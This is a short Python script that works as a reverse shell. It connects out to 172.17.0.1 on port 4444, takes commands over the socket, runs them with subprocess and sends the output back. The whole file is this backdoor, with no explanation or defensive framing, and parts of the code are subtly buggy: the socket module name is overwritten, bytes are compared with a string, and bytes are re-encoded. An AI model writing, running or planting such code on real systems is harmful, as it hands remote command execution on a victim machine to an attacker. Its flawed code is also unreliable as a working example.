import socket
import subprocess

IP = "172.17.0.1"
PORT = 4444

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((IP, PORT))

while True:

    cmdata = socket.recv(1024)
    if cmdata == "exit":
        socket.close()
    else:
        databack = subprocess.check_output(cmdata.decode('utf-8'))
        socket.send(databack.encode())
